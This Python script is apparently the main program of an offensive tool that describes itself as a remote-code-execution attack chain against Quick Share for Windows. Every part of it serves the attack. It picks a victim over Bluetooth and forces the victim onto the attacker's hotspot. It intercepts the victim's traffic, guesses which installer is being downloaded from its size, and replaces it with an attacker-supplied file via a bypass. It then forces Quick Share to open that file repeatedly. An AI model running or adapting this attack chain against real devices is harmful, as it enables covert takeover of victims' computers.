import argparse
import time
import logging
from quick_shell_rce_tool.downloadable_file import DownloadableFile
from quick_shell_rce_tool.https_domain_path_monitor import HttpsDomainPathMonitor
from quick_shell_rce_tool.mitm_sniffer import init_pydivert_mitm_sniffer, get_mitm_sniffer
from quick_shell_rce_tool.real_time_tcp_data_counter import RealTimeTcpDataCounter
from quick_shell_rce_tool.utils import calc_bigger_in_percentage, get_closest
from quick_shell_rce_tool.config_tools import parse_popular_files_yaml
from quick_shell_rce_tool.quick_share_discovery import QuickShareWifiLanScanner, QuickShareBleScanner, QuickShareBleDevice
from quick_shell_rce_tool.quick_share_actions import force_wifi_connection_using_quick_share, send_file_with_bypass_using_quick_share, force_quick_share_to_continuously_open_file


MIN_ENCRYPTED_FILE_SIZE_OVERHEAD_PERCENTAGE = 0.1
MAX_ENCRYPTED_FILE_SIZE_OVERHEAD_PERCENTAGE = 15

AVERAGE_ENCRYPTED_FILE_SIZE_OVERHEAD = 5


def guess_file(potential_files: tuple[DownloadableFile], encrypted_file_size) -> DownloadableFile:
    files_sorted_by_size = sorted(potential_files, key = lambda file: file.size)

    percentage_overhead_to_files_in_range = {}
    for downloadable_file in files_sorted_by_size:
        current_file_percentage_overhead = calc_bigger_in_percentage(downloadable_file.size, encrypted_file_size)
        if MIN_ENCRYPTED_FILE_SIZE_OVERHEAD_PERCENTAGE < current_file_percentage_overhead < MAX_ENCRYPTED_FILE_SIZE_OVERHEAD_PERCENTAGE:
            percentage_overhead_to_files_in_range[current_file_percentage_overhead] = downloadable_file
    
    if len(percentage_overhead_to_files_in_range) == 0:
        return None
    
    closest_overhead_to_average = get_closest(percentage_overhead_to_files_in_range.keys(), AVERAGE_ENCRYPTED_FILE_SIZE_OVERHEAD)
    return percentage_overhead_to_files_in_range[closest_overhead_to_average]


def pretty_print_ble_devices(quick_share_ble_devices):
    for index, device in enumerate(quick_share_ble_devices):
        print(f"[{index}]\tName: {device.endpoint_info.name}\n\tBT Address: {device.bt_addr}\n\tDevice Type: {device.endpoint_info.device_type.name}\n")


def run_choose_target_loop() -> QuickShareBleDevice:
    quick_share_ble_scanner = QuickShareBleScanner()
    quick_share_ble_scanner.start_background_scanning()

    print("Scanning for Quick Share devices over BLE...")
    while True:
        print("Choose one of the following options:")
        print("[0]\tView devices found by now")
        print("[1]\tStop scanning and choose target")
        print("[2]\tExit\n")
        choice = int(input("Enter your choice here: "))
        if choice == 0:
            print()
            devices = quick_share_ble_scanner.get_findings()
            if len(devices) == 0:
                print("Did not find any QuickShare devices over BLE yet")
            else:
                print("Devices found by now:")
                pretty_print_ble_devices(devices)
        elif choice == 1:
            quick_share_ble_scanner.stop()
            break
        elif choice == 2:
            return 0

    quick_share_ble_devices = quick_share_ble_scanner.get_findings()
    if len(quick_share_ble_devices) == 0:
        print("Did not find any QuickShare devices over BLE, Exiting...")
        return 0
    
    print("\nChoose target:")
    pretty_print_ble_devices(quick_share_ble_devices)
    
    chosen_index = int(input("Enter your choice here: "))
    return quick_share_ble_devices[chosen_index]


def get_target_ip_quick_share_wifi_lan_new_port(quick_share_wifi_lan_scanner: QuickShareWifiLanScanner, target_ip: str, target_old_port: int = 0) -> int:
    quick_share_wifi_lan_devices = quick_share_wifi_lan_scanner.get_findings()
    for device in quick_share_wifi_lan_devices:
        if device.ip == target_ip and device.port != target_old_port:
            return device.port
    
    return 0


def parse_arguments():
    parser = argparse.ArgumentParser(description="An RCE attack chain tool against Quick Share for Windows. Capable of remotely overwriting executables of popular installers downloaded by Chrome on a Windows computer that has Quick Share")

    parser.add_argument("AP_ssid", help="SSID of the attacker's Wi-Fi hotspot. There should be an active Wi-Fi hotspot on the same Windows computer that this tool runs on")
    parser.add_argument("AP_pass", help="Password required to connect to the hotspot")
    parser.add_argument("AP_ip", help="IP address of the hotspot's interface")
    parser.add_argument("AP_freq", help="Frequency of the access point in Mhz")
    parser.add_argument("file_to_send_path", help="Path to the file that will overwrite the victim's downloaded executables")
    parser.add_argument("popular_files_yaml", help="Path to a YAML file mapping Domain Paths to popular executables and their sizes")

    return parser.parse_args()


def main():
    logging.basicConfig(level=logging.INFO)
    args = parse_arguments()
    domain_paths_to_files = parse_popular_files_yaml(args.popular_files_yaml)

    target_bt_addr = run_choose_target_loop().bt_addr

    logging.info("Starting to scan for LAN Quick Share devices in the background...")
    quick_share_wifi_lan_scanner = QuickShareWifiLanScanner()
    quick_share_wifi_lan_scanner.start_background_scanning()

    logging.info("Forcing target into connecting to our hotspot")
    target_ip = force_wifi_connection_using_quick_share(target_bt_addr, args.AP_ssid, args.AP_pass, args.AP_ip, args.AP_freq)
    if target_ip == None:
        logging.error("Could not connect target to our WiFi hotspot")
        return 0
    
    logging.info(f"Target has successfully connected to our WiFi hotspot. It has the following IP: {target_ip}")
    target_old_listen_port = get_target_ip_quick_share_wifi_lan_new_port(quick_share_wifi_lan_scanner, target_ip) # Victim's Quick Share MDNS service stays live after we crashed it

    init_pydivert_mitm_sniffer(f"(ip.SrcAddr == {target_ip} or ip.DstAddr == {target_ip})")
    mitm_sniffer = get_mitm_sniffer()
    mitm_sniffer.open()

    old_mitm_sniffer = None
    while True:
        if old_mitm_sniffer != None:
            old_mitm_sniffer = mitm_sniffer
            init_pydivert_mitm_sniffer(f"(ip.SrcAddr == {target_ip} or ip.DstAddr == {target_ip})")
            mitm_sniffer = get_mitm_sniffer()
            mitm_sniffer.open()
            old_mitm_sniffer.close()

        domain_path_monitor = HttpsDomainPathMonitor(mitm_sniffer, domain_paths_to_files.keys())
        domain_path_hit, domain_path_hit_ips = domain_path_monitor.monitor_until_hit()
        domain_ip = domain_path_hit_ips[-1]
        
        logging.info(f"The victim has walked through a domain path we were looking for: {domain_path_hit}")
        logging.info(f"The IP of the last domain is: {domain_ip}")

        target_port = get_target_ip_quick_share_wifi_lan_new_port(quick_share_wifi_lan_scanner, target_ip, target_old_listen_port)
        # "0" means that the victim is not found, "target_old_listen_port" means that the victim's MDNS service is still live from before we crashed it 
        if target_port == 0 or target_port == target_old_listen_port:
            logging.info("Victim's Quick Share was not found in the LAN yet, not trying the exploit. (Quick Share is automatically run by Windows every 15 minutes)")
            continue
        
        logging.info(f"Victim's Quick Share listening address: {target_ip}:{target_port}")

        old_mitm_sniffer = mitm_sniffer
        init_pydivert_mitm_sniffer(f"(ip.SrcAddr == {domain_ip})")
        mitm_sniffer = get_mitm_sniffer()
        mitm_sniffer.open()
        old_mitm_sniffer.close()

        tcp_data_counter = RealTimeTcpDataCounter(mitm_sniffer, sender_ip=domain_ip, receiver_ip=target_ip)
        data_count, left_packets_queue = tcp_data_counter.count_data_until_timeout(sec_timeout = 3.0)

        logging.info(f"The victim is trying to download a file with size of about: {data_count / 1024 / 1024} MB")
        
        guessed_file = guess_file(domain_paths_to_files[domain_path_hit], data_count)
        if guessed_file == None:
            logging.info("Could not find a file that matches the estimated file size")    
            continue

        logging.info(f"Our guess for the file the victim is trying to download is: {guessed_file.name} ({guessed_file.size} Bytes)")

        logging.info("Sending the file before the download is finished")
        send_file_with_bypass_using_quick_share("wifi_lan", target_ip, target_port, args.file_to_send_path, guessed_file.name.encode())
        time.sleep(2) # The next send will not work if we will not wait a few seconds
        logging.info("Forcing victim's nearby share to continuously open the the file we sent")
        force_quick_share_to_continuously_open_file("wifi_lan", target_ip, target_port, args.file_to_send_path, guessed_file.name.encode())

        for packet in left_packets_queue:
            mitm_sniffer.send(packet)
        left_packets_queue.clear()

    mitm_sniffer.close()


if __name__ == "__main__":
    main()